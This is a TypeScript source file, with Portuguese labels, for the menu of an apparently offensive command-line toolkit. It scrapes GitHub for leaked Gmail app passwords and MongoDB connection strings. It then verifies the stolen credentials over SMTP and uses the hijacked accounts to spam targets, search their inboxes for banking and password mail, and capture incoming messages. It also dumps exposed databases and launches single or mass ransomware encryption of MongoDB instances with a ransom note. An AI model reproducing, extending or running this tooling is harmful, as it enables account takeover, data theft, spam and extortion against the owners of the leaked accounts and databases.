import { select, input, confirm } from "@inquirer/prompts";
import chalk from "chalk";
import ora from "ora";
import inquirer from "inquirer";
import nodemailer from "nodemailer";
import fs from "fs";

import {
  bots,
  getUrlsMongodbFromGithub,
  GitHubScraper,
} from "../GitHubScraper.js";
import { run as runAnalyse } from "../commands/analyse.js";
import { MongoSleuth } from "../commands/dump.js";
import { runMassiveRansomware } from "../commands/ransomwareRunner.js";
import { lockDatabase } from "./cryp.js";
import { mongoManagerMenu } from "../commands/MongoManager.js";
import { buscarEmailsPorKeywords } from "../reader.js";
import { listenEmailNotifications } from "./listener.js";

async function managerChoice(choice: string) {
  switch (choice) {
    case "emails":
      const emailAction = await select({
        message: "Opções de Email:",
        choices: [
          { name: "   TestEmail (Registrar)", value: "test" },
          { name: "   Single Send (Usar salvo)", value: "single_send" },
          { name: "   SPAM emails (Usar todos)", value: "spam" },
          { name: "   Search emails", value: "search" },
          {
            name: " 🔥 Auto-Collect & Test (GitHub -> Verificador)",
            value: "auto_collect",
          },
          // No select de emailAction, adicione:
          {
            name: " 🔥 Massive Validation (Arquivo local)",
            value: "massive_validation",
          },
          { name: " 📡 Listen Email Notification", value: "listen" },
          { name: chalk.red("   Delete Email"), value: "delete" },
          { name: chalk.gray("   Voltar"), value: "back" },
        ],
      });

      if (emailAction === "back") break;

      if (emailAction === "auto_collect") {
        const validFile = "emails_validos.txt";
        const tempFile = "temp_scraped_emails.txt";

        console.log(
          chalk.blue.bold("\n--- 🕵️ Configuração de Busca Automatizada ---"),
        );

        const keywords = await collectList(
          "Keywords para buscar no GitHub (ex: EMAIL_USER=be):",
          true,
        );

        const botIndex = Number(
          await input({ message: "Índice do Bot (Cookie):", default: "0" }),
        );

        // 1. SCRAPING
        const spinner = ora("Iniciando Scraper no GitHub...").start();
        const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
        const rawHeaders = [
          `Host: github.com`,
          `Cookie: ${selectedCookie}`,
        ].join("\n");

        const bot = new GitHubScraper();
        try {
          await bot.main(
            rawHeaders,
            keywords,
            tempFile,
            7,
            [".env", ".md", ".txt"],
            ["example", "YOUR_"],
            1,
            true,
          );
          spinner.succeed(
            chalk.green(`[+] Scraping finalizado. Resultados em ${tempFile}`),
          );

          if (!fs.existsSync(tempFile)) {
            console.log(chalk.red("[-] Nenhum arquivo de raspagem gerado."));
            return; // ou break dependendo do contexto do loop
          }

          const content = fs.readFileSync(tempFile, "utf-8");
          const blocks = content.split(
            "------------------------------------------------------------",
          );

          // 2. CARREGAR EMAILS JÁ EXISTENTES (Cache para performance)
          const existingEmails = new Set(
            fs.existsSync(validFile)
              ? fs
                  .readFileSync(validFile, "utf-8")
                  .split("\n")
                  .filter(Boolean)
                  .map((line) => line.split(":")[0].toLowerCase())
              : [],
          );

          console.log(
            chalk.cyan(
              `[*] Validando ${blocks.length} blocos (Filtro de duplicatas ativo)...\n`,
            ),
          );

          const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
          const REGEX_PASS =
            /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

          for (const block of blocks) {
            const emailMatch = block.match(REGEX_EMAIL);
            const passMatch = block.match(REGEX_PASS);

            if (emailMatch && passMatch) {
              const email = emailMatch[0].toLowerCase();
              const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

              // TRAVA DE DUPLICATA COM NOTIFICAÇÃO
              if (existingEmails.has(email)) {
                console.log(
                  chalk.yellow(`   [!] Ignorado: ${email} já registrado.`),
                );
                continue;
              }

              if (cleanPass.length === 16) {
                const vSpinner = ora(`Testando: ${email}`).start();
                try {
                  const transporter = nodemailer.createTransport({
                    host: "smtp.gmail.com",
                    port: 587,
                    secure: false,
                    auth: { user: email, pass: cleanPass },
                    connectionTimeout: 5000,
                  });

                  await transporter.verify();

                  // SALVAMENTO E ATUALIZAÇÃO DO CACHE
                  fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
                  existingEmails.add(email); // Evita que o mesmo scraping registre o mesmo email duas vezes

                  vSpinner.succeed(chalk.green(`HIT! ${email} salvo.`));
                } catch (err) {
                  vSpinner.fail(chalk.gray(`Falha: ${email}`));
                }
              }
            }
          }

          const keep = await confirm({
            message: "Manter arquivo temporário?",
            default: false,
          });
          if (!keep) fs.unlinkSync(tempFile);
        } catch (err: any) {
          spinner.fail(chalk.red("Erro no processo: " + err.message));
        }
      }

      if (emailAction === "massive_validation") {
        const inputFile = await input({
          message: "Caminho do arquivo com os blocos de texto:",
          default: "temp_scraped_emails.txt",
        });

        if (!fs.existsSync(inputFile)) {
          console.log(chalk.red("[-] Arquivo não encontrado."));
          return;
        }

        const validFile = "emails_validos.txt";
        const content = fs.readFileSync(inputFile, "utf-8");

        // Divide o arquivo pelos separadores de bloco do seu scraper
        const blocks = content.split(
          "------------------------------------------------------------",
        );

        // Carrega cache de emails já validados para evitar re-testar
        const existingEmails = new Set(
          fs.existsSync(validFile)
            ? fs
                .readFileSync(validFile, "utf-8")
                .split("\n")
                .map((l: any) => l.split(":")[0].toLowerCase())
            : [],
        );

        console.log(
          chalk.cyan(
            `[*] Iniciando validação massiva de ${blocks.length} blocos...\n`,
          ),
        );

        const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
        const REGEX_PASS =
          /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

        for (const block of blocks) {
          const emailMatch = block.match(REGEX_EMAIL);
          const passMatch = block.match(REGEX_PASS);

          if (emailMatch && passMatch) {
            const email = emailMatch[0].toLowerCase();
            const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

            if (existingEmails.has(email)) {
              console.log(
                chalk.yellow(`   [!] Pulando: ${email} (já no banco)`),
              );
              continue;
            }

            const vSpinner = ora(`Validando: ${email}`).start();
            try {
              const transporter = nodemailer.createTransport({
                host: "smtp.gmail.com",
                port: 587,
                secure: false,
                auth: { user: email, pass: cleanPass },
                connectionTimeout: 5000,
              });

              await transporter.verify();

              fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
              existingEmails.add(email);
              vSpinner.succeed(chalk.green(`HIT! ${email}`));
            } catch (err) {
              vSpinner.fail(chalk.gray(`Falha: ${email}`));
            }
          }
        }
        console.log(chalk.blue.bold("\n[+] Processo de validação concluído."));
      }

      // DELETE LOGIC
      if (emailAction === "delete") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum email para deletar."));
          break;
        }
        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        const toDelete = await select({
          message: "Selecione o email para REMOVER:",
          choices: lines.map((l) => ({ name: l, value: l })),
        });
        const newLines = lines.filter((l) => l !== toDelete);
        fs.writeFileSync(
          "emails_validos.txt",
          newLines.join("\n") + (newLines.length ? "\n" : ""),
        );
        console.log(chalk.green("[!] Email removido com sucesso."));
      }

      if (emailAction === "listen") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
          break;
        }

        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);

        const selectedAccount = await select({
          message: "Selecione a conta para colocar em ESCUTA:",
          choices: lines.map((l) => ({ name: l, value: l })),
        });

        const [u, p] = selectedAccount.split(":");

        // Chama a função de escuta (que criamos no listener.ts)

        const news = await listenEmailNotifications(u, p);

        if (news.length > 0) {
          console.log(
            chalk.green(
              `\n\n[!] Escuta finalizada. ${news.length} emails capturados.`,
            ),
          );

          let browsing = true;
          while (browsing) {
            const viewChoice = await select({
              message: "Gerenciar emails capturados:",
              choices: [
                {
                  name: "🔍 Selecionar e ler email (Ver conteúdo)",
                  value: "read",
                },
                { name: "💾 Salvar todos em .txt", value: "save" },
                {
                  name: chalk.gray("⬅ Voltar ao menu principal"),
                  value: "back",
                },
              ],
            });

            if (viewChoice === "back") {
              browsing = false;
              break;
            }

            if (viewChoice === "read") {
              const targetMsg = await select({
                message: "Escolha qual email deseja abrir:",
                choices: [
                  ...news.map((n, i) => ({
                    name: `[${i + 1}] De: ${n.from} | Assunto: ${n.subject}`,
                    value: i,
                  })),
                  { name: chalk.red(" Escolher outra opção..."), value: -1 },
                ],
              });

              if (targetMsg === -1) continue;

              console.clear();
              console.log(chalk.yellow.bold("\n--- CABEÇALHO ---"));
              console.log(chalk.white(`DE: ${news[targetMsg].from}`));
              console.log(chalk.white(`ASSUNTO: ${news[targetMsg].subject}`));
              console.log(chalk.yellow.bold("\n--- CONTEÚDO (RAW SOURCE) ---"));
              console.log(chalk.cyan(news[targetMsg].body));
              console.log(
                chalk.yellow.bold("\n-----------------------------\n"),
              );

              await input({
                message: chalk.gray(
                  "Pressione Enter para voltar à lista de capturados...",
                ),
              });
              console.clear();
            }

            if (viewChoice === "save") {
              const logName = await input({
                message: "Nome do arquivo para salvar a sessão:",
                default: `session_${u.split("@")[0]}.txt`,
              });

              const content = news
                .map(
                  (n: any) =>
                    `DE: ${n.from}\nASSUNTO: ${n.subject}\nCONTEÚDO:\n${n.body}\n${"=".repeat(40)}\n`,
                )
                .join("\n");

              fs.writeFileSync(logName, content);
              console.log(
                chalk.green(
                  `[+] Todos os ${news.length} emails salvos em ${logName}`,
                ),
              );
            }
          }
        } else {
          console.log(
            chalk.gray("\n[-] Nenhum email chegou durante a sessão de escuta."),
          );
        }
      }

      if (emailAction === "test") {
        while (true) {
          const user = await input({
            message: "Email:",
            default: "digite o email ou .exit pra sair",
          });

          if (user === ".exit") break;

          const pass = await input({
            message: "Senha:",
            default: "digite a senha ou .exit pra sair",
          });

          if (pass === ".exit") break;

          if (isEmailDuplicate(user)) {
            console.log(
              chalk.red(`\n [X] Erro: O e-mail ${user} já está registrado!\n`),
            );
            continue; // Volta para o prompt de e-mail
          }

          const spinner = ora("Validando...").start();
          try {
            const transporter = nodemailer.createTransport({
              service: "gmail",
              auth: { user, pass },
            });
            await transporter.verify();
            fs.appendFileSync("emails_validos.txt", `${user}:${pass}\n`);
            spinner.succeed(
              chalk.green("Válido e salvo em emails_validos.txt"),
            );
          } catch (err: any) {
            spinner.fail(chalk.red("Erro: " + err.message));
          }
          const enter = await input({
            message: "Continuar",
          });
          console.clear();
        }
      }

      if (emailAction === "single_send" || emailAction === "spam") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum email salvo encontrado."));
          break;
        }
        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        const subject = await input({ message: "Subject de destino:" });
        const target = await input({ message: "Email de destino:" });
        const content = await input({ message: "Conteúdo da mensagem:" });

        if (emailAction === "single_send") {
          const li = lines.map((l) => ({ name: l, value: l }));
          li.push({ name: "exit", value: "exit" });
          const selected = await select({
            message: "Escolha a credencial:",
            choices: li,
          });

          if (selected === "exit") break;

          const [u, p] = selected.split(":");

          const s = ora("Enviando...").start();
          try {
            const transporter = nodemailer.createTransport({
              service: "gmail",
              auth: { user: u, pass: p },
            });
            await transporter.sendMail({
              from: u,
              to: target,
              subject,
              text: content,
            });
            s.succeed(chalk.green("Enviado!"));
          } catch (err: any) {
            s.fail(chalk.red(err.message));
          }
        } else if (emailAction === "spam") {
          console.log(
            chalk.yellow(`[*] Iniciando SPAM com ${lines.length} contas...`),
          );
          for (const line of lines) {
            const [u, p] = line.split(":");
            const s = ora(`Enviando de: ${u}`).start();
            try {
              const transporter = nodemailer.createTransport({
                service: "gmail",
                auth: { user: u, pass: p },
              });
              await transporter.sendMail({
                from: u,
                to: target,
                subject,
                text: content,
              });
              s.succeed();
            } catch (err: any) {
              s.fail(chalk.red(`Falha: ${u}`));
            }
          }
        }
      }

      if (emailAction === "search") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
          break;
        }

        const searchKeywords = await collectList(
          "Keywords para buscar (ex: @nubank, senha):",
          true,
        );

        // Pergunta o nome do arquivo de saída
        const outputFile = await input({
          message: "Nome do arquivo para salvar os resultados:",
          default: "search_results.txt",
        });

        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        console.log(
          chalk.yellow(
            `[*] Iniciando busca profunda em ${lines.length} contas...\n`,
          ),
        );

        for (const line of lines) {
          const [u, p] = line.split(":");
          const s = ora(`Acessando: ${u}`).start();

          try {
            // A função agora retorna os matches encontrados
            const results = await buscarEmailsPorKeywords(searchKeywords, u, p);

            if (results && results.length > 0) {
              const dataToSave = results
                .map(
                  (res) =>
                    `CONTA: ${u}\nDE: ${res.from}\nASSUNTO: ${res.subject}\nID: ${res.id}\n---------------------------\n`,
                )
                .join("");

              fs.appendFileSync(outputFile, dataToSave);
              s.succeed(
                chalk.green(`Encontrados ${results.length} matches em ${u}`),
              );
            } else {
              s.info(chalk.gray(`Nenhum match em ${u}`));
            }
          } catch (err: any) {
            s.fail(chalk.red(`Erro em ${u}: ${err.message}`));
          }
        }
        console.log(
          chalk.cyan(`\n[!] Relatório completo salvo em: ${outputFile}`),
        );
      }

      break;

    case "mongodb_menu":
      const mongoChoice = await select({
        message: "Selecione a opção MongoDb:",
        choices: [
          { name: "   Start Analyse Urls", value: "analyse" },
          { name: "   Dump Massive", value: "dump" },
          { name: "   MongoDBs URIs", value: "mng_manager" },
          { name: chalk.gray("   Voltar"), value: "back" },
        ],
      });
      if (mongoChoice === "mng_manager") await mongoManagerMenu();
      if (mongoChoice === "analyse") {
        const inputFile = await input({
          message: "Arquivo para análise:",
          default: "resultsGits.txt",
        });
        await runAnalyse(inputFile);
      }
      if (mongoChoice === "dump") {
        const dumpInput = await input({
          message: "Arquivo input:",
          default: "privileges_report.txt",
        });
        const sleuth = new MongoSleuth();
        await sleuth.iniciar(dumpInput);
      }
      break;

    case "ransomware_menu":
      const ransomMode = await select({
        message: "Selecione o tipo de operação de Ransomware:",
        choices: [
          { name: "🎯 URI Especificada (Alvo Único)", value: "single" },
          { name: "💀 Ransomware Massive (Relatório)", value: "massive" },
          { name: chalk.gray("⬅ Voltar"), value: "back" },
        ],
      });
      if (ransomMode === "back") break;
      const keySecret = await input({
        message: chalk.bold("Defina a CHAVE SECRETA:"),
        validate: (v) => v.length > 0 || "Obrigatório!",
      });
      const ransomMsg = await input({
        message: "Mensagem:",
        default: "Dados criptografados.",
      });
      const contactInfo = await input({
        message: "Contato:",
        default: "estudante@cybersec.edu",
      });

      if (ransomMode === "single") {
        const targetUri = await input({
          message: "URI MongoDB:",
          validate: (v) => v.includes("mongodb"),
        });
        if (await confirm({ message: chalk.red("⚠️ CONFIRMAR?") })) {
          const s = ora("Injetando...").start();
          try {
            await lockDatabase(targetUri, keySecret, ransomMsg, contactInfo);
            s.succeed("Finalizado!");
          } catch (e: any) {
            s.fail(e.message);
          }
        }
      } else if (ransomMode === "massive") {
        await runMassiveRansomware(keySecret, ransomMsg, contactInfo);
      }
      break;

    case "git":
      const gitMode = await select({
        message: "Selecione o modo de busca GitHub:",
        choices: [
          { name: "🍃 MongoDB Scanner (Padrão)", value: "mongo_default" },
          { name: "🔍 Search Personalized (Custom)", value: "custom" },
          { name: chalk.gray("⬅ Voltar"), value: "back" },
        ],
      });

      if (gitMode === "back") break;

      // Variáveis de controle
      let keywords: string[] = [];
      let whitelist: string[] = [];
      let blacklist: string[] = [];
      let pageEnd = 5;
      let filename = "resultsGits.txt";
      let pageInitial = 1;
      let botIndex = 0;
      let isHeadless = true;

      if (gitMode === "mongo_default") {
        keywords = [
          "MONGO_DB_URI=mongodb+srv://",
          "MONGODB_URI=mongodb+srv://",
          "MONGO_KEY=mongodb+srv://",
          "MONGODB_CONNECTION=mongodb+srv://",
        ];
        whitelist = [".env", "config.js", ".txt", ".md"];
        blacklist = [
          "username",
          "//[",
          "USERNAME",
          "your_password",
          "xxxxxxxx",
        ];

        // pageEnd = Number(
        //   await input({ message: "Quantidade de páginas:", default: "20" }),
        // );
        botIndex = Number(
          await input({ message: "Índice do Bot (Cookie):", default: "0" }),
        );
      } else {
        console.log(chalk.blue.bold("\n--- Configuração de Keywords ---"));
        keywords = await collectList("Quais variáveis buscar?", true);

        console.log(
          chalk.blue.bold("\n--- Configuração de Filtros (Whitelist) ---"),
        );
        whitelist = await collectList("Whitelist (ex: .env, config.js):");

        console.log(
          chalk.blue.bold("\n--- Configuração de Bloqueios (Blacklist) ---"),
        );
        blacklist = await collectList("Blacklist (ex: password, xxxx):");

        console.log(chalk.blue.bold("\n--- Parâmetros de Execução ---"));
        filename = await input({
          message: "Nome do arquivo de saída:",
          default: "custom_results.txt",
        });
        // pageEnd = Number(
        //   await input({ message: "Página Final:", default: "1" }),
        // );
        pageInitial = Number(
          await input({ message: "Página Inicial:", default: "1" }),
        );
        botIndex = Number(
          await input({
            message: `Índice do Bot (0 a ${bots.length - 1}):`,
            default: "0",
          }),
        );
        isHeadless = await confirm({
          message: "Executar em modo Headless (oculto)?",
          default: true,
        });
      }

      // Validação do Cookie selecionado
      const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
      if (!selectedCookie) {
        console.log(chalk.red("[-] Índice de bot inválido!"));
        break;
      }

      const rawHeaders = [
        `Host: github.com`,
        `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
        `Cookie: ${selectedCookie}`,
        `Connection: keep-alive`,
      ].join("\n");

      console.clear();

      console.log(
        chalk.yellow(
          `\n[*] Iniciando Scraper com ${keywords.length} keywords...`,
        ),
      );

      const bot = new GitHubScraper();
      try {
        await bot.main(
          rawHeaders,
          keywords,
          filename,
          pageEnd,
          whitelist,
          blacklist,
          pageInitial,
          isHeadless,
        );
      } catch (err: any) {
        console.error(
          chalk.red("\n[-] Falha crítica na execução:"),
          err.message,
        );
      }
      break;
  }
}
